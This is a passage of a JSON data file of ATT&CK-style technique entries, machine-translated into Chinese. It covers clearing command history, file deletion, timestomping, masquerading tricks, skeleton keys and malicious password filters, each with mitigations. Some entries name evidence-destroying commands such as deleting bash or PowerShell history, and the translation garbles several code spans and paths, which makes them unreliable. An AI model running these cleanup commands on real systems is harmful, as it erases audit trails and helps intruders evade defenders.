              "content": "在本地和运输中混淆/加密事件文件，以避免向对手提供反馈。"
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "自动将事件转发到日志服务器或数据存储库中，以防止对手可以在本地系统上找到和操纵数据的条件。在可能的情况下，将事件报告的时间延迟最小化，以避免在本地系统上延长存储。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "保护生成的事件文件，这些文件在本地存储，并具有适当的许可和身份验证，并限制了对手通过防止特权升级机会增加特权的机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070.003",
    "name": "Clear Command History",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "除了清除系统日志外，对手还可以清除受损帐户的命令历史记录，以掩盖入侵期间所采取的行动。各种命令口译员跟踪命令用户在其终端中输入的键入，以便用户可以重新检测他们所做的工作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，可以通过几种不同的方式访问这些命令历史。在登录时，此命令历史记录是在环境变量"
        },
        {
          "type": "code",
          "content": " histfile "
        },
        {
          "type": "text",
          "content": "指向的文件中跟踪的。当用户登录系统时，将此信息冲入用户主目录中的文件，称为"
        },
        {
          "type": "code",
          "content": "〜/.bash_history "
        },
        {
          "type": "text",
          "content": "。这样做的好处是，它允许用户回到不同会话中以前使用的命令。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过手动清除历史记录（"
        },
        {
          "type": "code",
          "content": "历史记录-c "
        },
        {
          "type": "text",
          "content": "）从这些日志中删除其命令，或删除bash历史文件"
        },
        {
          "type": "code",
          "content": " rm〜/.bash_history "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以利用网络设备上的网络设备CLI清除命令历史记录数据（"
        },
        {
          "type": "code",
          "content": "清除日志"
        },
        {
          "type": "text",
          "content": "和/或"
        },
        {
          "type": "code",
          "content": " clear> clear>“清除历史记录” "
        },
        {
          "type": "text",
          "content": "）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Windows主机上，PowerShell有两个不同的命令历史记录提供程序：内置历史记录和由"
        },
        {
          "type": "code",
          "content": " psReadline "
        },
        {
          "type": "text",
          "content": "模块管理的命令历史记录。内置历史记录仅跟踪当前会话中使用的命令。此命令历史记录无法用于其他会话，并且会话结束时删除。"
        }
      ],
      [
        {
          "type": "text",
          "content": ""
        },
        {
          "type": "code",
          "content": " psReadline "
        },
        {
          "type": "text",
          "content": "命令历史记录跟踪所有PowerShell会话中使用的命令，并将它们写入文件（"
        },
        {
          "type": "code",
          "content": " $ enk：appData \\ Microsoft \\ Microsoft \\ Windows \\ windows \\ powerShell \\ psreadline \\ conselehost \\ consolehost_thistory.txt "
        },
        {
          "type": "text",
          "content": " by by默认）。此历史记录文件可用于所有会话，并且包含所有过去的历史记录，因为该会话结束时未删除该文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以运行powershell命令"
        },
        {
          "type": "code",
          "content": " clear-History "
        },
        {
          "type": "text",
          "content": "从当前的PowerShell会话中冲洗整个命令历史记录。但是，这不会删除/刷新"
        },
        {
          "type": "code",
          "content": " consolehost_history.txt "
        },
        {
          "type": "text",
          "content": "文件。对手还可以删除"
        },
        {
          "type": "code",
          "content": " consoleHost_history.txt "
        },
        {
          "type": "text",
          "content": "文件或编辑其内容以隐藏其运行的PowerShell命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1039",
        "name": "环境变量权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使环境变量与命令历史记录读取仅可以确保保留历史记录。"
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "将历史数据向前记录到远程数据存储和集中记录解决方案，以保留历史命令行日志数据。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "防止用户删除或写入某些文件可以阻止对手恶意更改其"
            },
            {
              "type": "code",
              "content": "〜/.bash_history "
            },
            {
              "type": "text",
              "content": "或"
            },
            {
              "type": "code",
              "content": " consolehost_history.txt "
            },
            {
              "type": "text",
              "content": " files。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070.004",
    "name": "File Deletion",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会删除其入侵活动的动作留下的文件。由对手在系统上删除或创建的恶意软件，工具或其他非本地文件（Ex：Ingress工具传输）可能会留下痕迹，以指示网络中所做的事情以及如何指示。删除这些文件可能会在入侵期间或作为输入后过程的一部分，以最大程度地减少对手的足迹。"
        }
      ],
      [
        {
          "type": "text",
          "content": "主机操作系统有一些工具可以进行清理，但是对手也可以使用其他工具。内置命令和脚本解释器功能的示例包括Windows上的"
        },
        {
          "type": "code",
          "content": " del "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " rm "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " unlink </code "
        },
        {
          "type": "text",
          "content": "在Linux和MacOS上。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1070.005",
    "name": "Network Share Connection Removal",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会删除不再有用的共享连接，以清理其操作的痕迹。当不再需要时，Windows共享驱动器和SMB/Windows Admin共享连接可以删除。NET是一个示例实用程序，可用于使用<code> NET使用\\ System \\ Share /Delete < /code>命令删除网络共享连接。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1070.006",
    "name": "Timestomp",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改文件时间属性以隐藏新或更改现有文件。时间编写是一种修改文件的时间戳（修改，访问，创建和更改时间）的技术，通常以模仿同一文件夹中的文件。例如，这是在对手修改或创建的文件上完成的，以使得它们对法医研究者或文件分析工具似乎并不明显。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用时间表和伪装的文件名一起隐藏恶意软件和工具。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1070.007",
    "name": "Clear Network Connection History and Configurations",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以清除或删除恶意网络连接的证据，以清理其操作的痕迹。配置设置以及突出显示连接历史记录的各种工件可以在系统和/或需要网络连接的行为的应用程序日志上创建，例如远程服务或外部远程服务。防守者可以使用这些工件来监视或以其他方式分析对手创建的网络连接。"
        }
      ],
      [
        {
          "type": "text",
          "content": "网络连接历史记录可以存储在各个位置。例如，RDP连接历史记录可以存储在Windows注册表值中："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\终端服务器客户端\\默认"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\终端服务器客户端\\服务器"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows还可以存储有关文件中最近RDP连接的信息\\ Microsoft \\ terminalServer客户端\\ Cache \\ </code>。同样，MACOS和Linux主机可能会存储信息在系统日志中突出显示连接历史记录的信息（例如存储在"
        },
        {
          "type": "code",
          "content": "/Library/Logs/logs "
        },
        {
          "type": "text",
          "content": "和/或<code>/var/var/log/log/code>中的信息中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意网络连接还可能需要更改第三方应用程序或网络配置设置，例如禁用或修改系统防火墙或篡改以启用代理。对手可能会删除或修改此数据以掩盖指标和/或阻碍防御性分析。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "自动将事件转发到日志服务器或数据存储库中，以防止对手可以在本地系统上找到和操纵数据的条件。在可能的情况下，将事件报告的时间延迟最小化，以避免在本地系统上延长存储。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "保护生成的事件文件和日志，这些文件和日志在本地存储，并具有适当的权限和身份验证，并限制了对手通过防止特权升级机会增加特权的机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070.008",
    "name": "Clear Mailbox Data",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改邮件和邮件应用程序数据以删除其活动的证据。电子邮件应用程序允许用户和其他程序通过命令行工具或使用API导出和删除邮箱数据。邮件应用程序数据可以是应用程序或操作系统生成的电子邮件，电子邮件元数据或日志，例如导出请求。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以操纵电子邮件和邮箱数据以删除日志，文物和元数据，例如网络钓鱼/内部矛盾的证据，电子邮件收集，命令和控制的邮件协议，或基于电子邮件的剥落，例如替代协议上的删除。例如，为了删除交换服务器上的证据，对手已经使用了"
        },
        {
          "type": "code",
          "content": " ExchangePowerShell "
        },
        {
          "type": "text",
          "content": " PowerShell模块，包括"
        },
        {
          "type": "code",
          "content": " remove-MailboxExportrequrest "
        },
        {
          "type": "text",
          "content": "来删除邮箱出口的证据。在Linux和MacOS上，对手还可以通过名为"
        },
        {
          "type": "code",
          "content": " Mail "
        },
        {
          "type": "text",
          "content": "的命令行实用程序删除电子邮件，或使用AppleScript与MacOS上的API进行交互。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以删除指示垃圾邮件或可疑活动（例如，通过使用组织范围的运输规则）的电子邮件和元数据/标题，以减少安全产品检测到的恶意电子邮件的可能性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在交换环境中，管理员可以使用"
            },
            {
              "type": "code",
              "content": " Get-TransPortrule "
            },
            {
              "type": "text",
              "content": "/"
            },
            {
              "type": "code",
              "content": " remove-transportrule "
            },
            {
              "type": "text",
              "content": "来发现并删除潜在的恶意运输规则。"
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "自动将邮件数据和事件转发到日志服务器或数据存储库中，以防止对手可以在本地系统上找到和操纵数据的条件。在可能的情况下，将事件报告的时间延迟最小化，以避免在本地系统上延长存储。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "保护生成的事件文件，这些文件在本地存储，并具有适当的许可和身份验证，并限制了对手通过防止特权升级机会增加特权的机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1070.009",
    "name": "Clear Persistence",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Indicator Removal",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会清除与先前在宿主系统上持续建立的持久性相关的伪影，以消除其活动的证据。这可能涉及各种行动，例如删除服务，删除可执行文件，修改注册表，PLIST文件修改或其他清理方法，以防止捍卫者收集其持续存在的证据。对手还可以删除以前创建以保持持久性（即创建帐户）的帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些情况下，一旦执行对手的持久性，也可以删除持久性的工件，以防止恶意软件的新实例发生错误。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "自动将事件转发到日志服务器或数据存储库中，以防止对手可以在本地系统上找到和操纵数据的条件。在可能的情况下，将事件报告的时间延迟最小化，以避免在本地系统上延长存储。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "保护生成的事件文件，这些文件在本地存储，并具有适当的许可和身份验证，并限制了对手通过防止特权升级机会增加特权的机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1036.001",
    "name": "Invalid Code Signature",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试模仿有效代码签名的特征，以增加欺骗用户，分析师或工具的机会。代码签名提供了开发人员的二进制文件的一定程度，并保证二进制尚未篡改。对手可以从签名程序中复制元数据和签名信息，然后将其用作无签名程序的模板。具有无效代码签名的文件将使数字签名验证检查失败，但是它们可能对用户更合法，安全工具可能会不适当地处理这些文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与代码签名不同，此活动不会导致有效的签名。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "需要签名的二进制文件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1036.002",
    "name": "Right-to-Left Override",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用左右覆盖权（RTLO或RLO）字符（U+202E），以掩盖字符串和/或文件名，以使其显得良性。RTLO是一种非打印Unicode字符，它导致其后面的文本反向显示。例如，Windows屏幕保护程序可执行文件名为"
        },
        {
          "type": "code",
          "content": " 3月25日\\ U202EXCOD.SCR "
        },
        {
          "type": "text",
          "content": "将显示为"
        },
        {
          "type": "code",
          "content": " 3月25日rcs.docx "
        },
        {
          "type": "text",
          "content": "。名为"
        },
        {
          "type": "code",
          "content": " photo_high_re \\ u202egnp.js "
        },
        {
          "type": "text",
          "content": "的JavaScript文件将显示为"
        },
        {
          "type": "code",
          "content": " photo_high_resj.png "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用RTLO角色，以此作为欺骗用户执行他们认为是良性文件类型的手段。这种技术的常见用途是在矛盾的附件/恶意文件中使用，因为如果他们不了解其工具如何显示和呈现RTLO字符，它可能会欺骗最终用户和防御者。在许多有针对性的入侵尝试和犯罪活动中都可以看到使用RTLO角色。RTLO也可以在Windows注册表中使用，其中regedit.exe显示反向字符，但命令行工具reg.exe默认不在。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1036.003",
    "name": "Rename System Utilities",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会重命名合法的系统实用程序，以试图逃避有关这些公用事业使用的安全机制。系统公用事业对手可能会滥用安全监控和控制机制。可以通过在利用前重命名实用程序来绕过这些安全机制（ex：rename "
        },
        {
          "type": "code",
          "content": " rundll32.exe "
        },
        {
          "type": "text",
          "content": "）。当合法的实用程序被复制或移至其他目录并重命名以避免基于系统实用程序从非标准路径执行的检测时，就会发生另一种情况。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使用文件系统访问控件来保护诸如C：\\ Windows \\ System32之类的文件夹。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1036.004",
    "name": "Masquerade Task or Service",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图操纵任务或服务的名称，以使其显得合理或良性。任务调度程序或SystemD执行的任务/服务通常将给出名称和/或说明。Windows服务将具有服务名称以及显示名称。存在许多良性任务和服务，它们具有通常关联的名称。对手可以提供与合法执行者相似或相同的任务名称或服务名称。"
        }
      ],
      [
        {
          "type": "text",
          "content": "任务或服务包含其他字段（例如描述），即对手可能试图使其显得合法。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1036.005",
    "name": "Match Legitimate Name or Location",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "命名/放置它们时，对手可以匹配或近似合法文件或资源的名称或位置。这是为了逃避防御和观察。这可以通过将可执行文件放置在普遍信任的目录中（例如：在System32下）或命名合法，值得信赖的程序（例如：ex：svchost.exe）来完成。在容器化的环境中，这也可以通过在与容器吊舱或群集的命名约定的命名空间中创建资源来完成。另外，给出的文件或容器图像名称可能是合法程序/图像或无害的东西的近似值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以使用他们试图模仿的文件的相同图标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "需要签名的二进制文件和图像。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "使用这些工具，这些工具通过应用程序控制限制程序执行，该工具通过所需的常见操作系统实用程序以外的其他属性。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使用文件系统访问控件来保护诸如C：\\ Windows \\ System32之类的文件夹。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1036.006",
    "name": "Space after Filename",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过更改文件的扩展来隐藏程序的真实菲力型。对于某些文件类型（具体来说，这与.app扩展不适用于.App扩展），将一个空间附加到文件名的末尾将改变操作系统处理文件的处理方式。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，如果有一个Mach-O可执行文件，称为"
        },
        {
          "type": "code",
          "content": " evil.bin "
        },
        {
          "type": "text",
          "content": "，当用户双击时，它将启动terminal.app并执行。如果此文件将其重命名为"
        },
        {
          "type": "code",
          "content": " evil.txt "
        },
        {
          "type": "text",
          "content": "，则当用户双击时，它将使用默认的文本编辑应用程序（而不是执行二进制）启动。但是，如果文件被重命名为"
        },
        {
          "type": "code",
          "content": " evil.txt "
        },
        {
          "type": "text",
          "content": "（请注意末端的空间），则当用户双击时，True文件类型由OS确定并适当处理，并且二进制文件。将被执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用此功能来欺骗用户双击任何格式的良性文件，并最终执行恶意。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1036.007",
    "name": "Double File Extension",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在文件名中滥用双重扩展名，以作为伪装真实文件类型的一种手段。文件名可能包括一个辅助文件类型扩展名，该扩展名可能仅导致第一个扩展名显示（ex："
        },
        {
          "type": "code",
          "content": " file.txt.exe "
        },
        {
          "type": "text",
          "content": "可以在某些视图中呈现，只是<code> file.txt </代码>）。但是，第二个扩展名是确定文件的打开和执行方式的真实文件类型。实际文件扩展名可以由文件浏览器中的操作系统（例如：Explorer.exe）以及使用系统策略配置或类似的任何软件中隐藏。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用双重扩展，以试图隐藏危险的文件类型的有效载荷。一种非常常见的用法涉及欺骗用户打开他们认为是良性文件类型的内容，但实际上是可执行的代码。此类文件通常构成电子邮件附件，并允许对手通过spearphenting附件然后执行用户执行，从而获得对用户系统的初始访问。例如，名为"
        },
        {
          "type": "code",
          "content": " eve.txt.exe "
        },
        {
          "type": "text",
          "content": "的可执行文件附件可以向用户显示为"
        },
        {
          "type": "code",
          "content": " eve..txt "
        },
        {
          "type": "text",
          "content": "。然后，用户可以将其视为良性文本文件并将其打开，无意间执行隐藏的恶意软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "常见的文件类型，例如文本文件（.txt，.doc等）和图像文件（.jpg，.gif等）通常用作第一个出现良性的扩展名。可执行的扩展名通常被视为危险，例如.exe，.lnk，.hta和.scr，通常显示为第二个扩展名和真实文件类型。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用Windows OS中的默认值为“隐藏已知文件类型的文件扩展名”。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "培训用户在文件名中寻找双重扩展，并在一般使用培训中作为一种对常见的网络钓鱼和矛盾技术的认识的方式，以及如何引起对潜在恶意事件的怀疑。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1036.008",
    "name": "Masquerade File Type",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过更改有效载荷格式（包括文件的签名，扩展名和内容）来伪装恶意有效载荷作为合法文件。各种文件类型具有典型的标准格式，包括它们的编码和组织方式。例如，文件的签名（也称为标题或魔术字节）是文件的开头，通常用于识别文件类型。例如，jpeg文件的标题为"
        },
        {
          "type": "code",
          "content": " 0xff 0xd8 "
        },
        {
          "type": "text",
          "content": "，文件扩展名是"
        },
        {
          "type": "code",
          "content": " .jpe </code "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " .jpeg </code "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": "。JPG "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以编辑标题的十六进制代码和/或恶意有效载荷的文件扩展名，以绕过文件验证检查和/或输入消毒。当有效载荷文件转移（例如，入口工具传输）并存储（例如，上传恶意软件）时，通常使用此行为，以便对手可以在不触发检测的情况下移动其恶意软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "常见的非执行文件类型和扩展名，例如文本文件（"
        },
        {
          "type": "code",
          "content": " .txt "
        },
        {
          "type": "text",
          "content": "）和图像文件（"
        },
        {
          "type": "code",
          "content": " .jpg "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " .gif "
        },
        {
          "type": "text",
          "content": "，等等。）通常被视为良性。基于此，对手可以使用文件扩展名来掩盖恶意软件，例如用"
        },
        {
          "type": "code",
          "content": " test.gif "
        },
        {
          "type": "text",
          "content": "的文件名命名PHP后门代码。由于良性外观和文件扩展，用户可能不知道文件是恶意的。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Polygot文件是具有多种不同文件类型的文件，并且根据将执行它们的应用程序以不同的功能，也可以用于掩盖恶意恶意软件和功能。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "防病毒/反疑问软件",
        "description": [
          [
            {
              "type": "text",
              "content": "反病毒可自动隔离可疑文件。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在端点上实施安全控件，例如主机入侵预防系统（HIPS），以识别和防止使用不匹配的文件签名执行文件。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "确保执行输入消毒并在执行前正确验证文件；此外，实施严格的允许列表，以确保仅处理授权的文件类型。限制和/或块执行文件和扩展不匹配的文件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1036.009",
    "name": "Break Process Trees",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Masquerading",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过修改执行恶意软件的父进程ID（PPID）来尝试逃避基于树的分析。如果端点保护软件利用“亲子”关系进行检测，那么打破这种关系可能会导致对手的行为与先前的过程树活动没有关联。在基于UNIX的系统上，破坏此过程树是管理员使用脚本和程序执行软件的常见实践。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux系统上，对手可以执行一系列本机API调用以更改恶意软件的过程树。例如，对手可以在没有任何参数的情况下执行其有效载荷，请调用"
        },
        {
          "type": "code",
          "content": " fork（）"
        },
        {
          "type": "text",
          "content": " API调用两次，然后将父进程退出。这将创建一个孙子过程，没有父母进程，该过程立即由"
        },
        {
          "type": "code",
          "content": " Init "
        },
        {
          "type": "text",
          "content": "系统进程（PID 1）采用，该过程成功地断开了对手有效载荷从其上一个进程树的执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "另一个示例是使用“守护程序” syscall脱离当前的父进程并在后台运行。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1556.001",
    "name": "Domain Controller Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在域控制器上修补身份验证过程，以绕过典型的身份验证机制并启用访问帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件可用于将虚假凭据注入域控制器的身份验证过程中，目的是创建用于访问任何用户帐户和/或凭据的后门（例如：skeleton键）。Skeleton密钥通过企业域控制器身份验证过程（LSASS）的补丁程序，具有对手可以用来绕过标准身份验证系统的凭据。修补后，对手可以使用注入的密码成功身份验证任何域用户帐户（直到域控制器的重新启动从内存中删除骨架键）。身份验证的访问可以使单因素身份验证环境中对主机和/或资源的不受限制访问。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域和本地帐户以及其许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。如果启用了默认帐户，或者创建尚未授权的新本地帐户，这些审核也应包括在内。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用功能，例如LSA的受保护的过程灯（PPL）。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.002",
    "name": "Password Filter DLL",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意密码过滤器动态链接库（DLL）注册到身份验证过程中，以在验证时获取用户凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows密码过滤器是域和本地帐户的密码策略执行机制。过滤器被实现为包含一种针对密码策略验证潜在密码的方法。滤波器DLL可以放在本地计算机上，用于本地帐户和/或域帐户的域控制器。在安全客户经理（SAM）中注册新密码之前，本地安全管理局（LSA）请求每个注册过滤器的验证。在每个注册过滤器确认验证之前，任何潜在的更改都无法生效。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以注册恶意密码过滤器，以从本地计算机和/或整个域收获凭据。要执行适当的验证，过滤器必须从LSA获得普通文本凭据。每次提出密码请求时，恶意密码过滤器都会收到这些普通文本凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保仅注册有效的密码过滤器。Windows安装目录中必须存在过滤器dll（默认情况下的C：\\ Windows \\ System32 \\）和/或本地计算机，该计算机在HKEY_LOCAL_MACHINE \\ SYSTEM \\ currentControlset \\ CurrentControlSet \\ LSA \\ LSA \\ Notification Package中具有相应的条目。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.003",
    "name": "Pluggable Authentication Modules",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
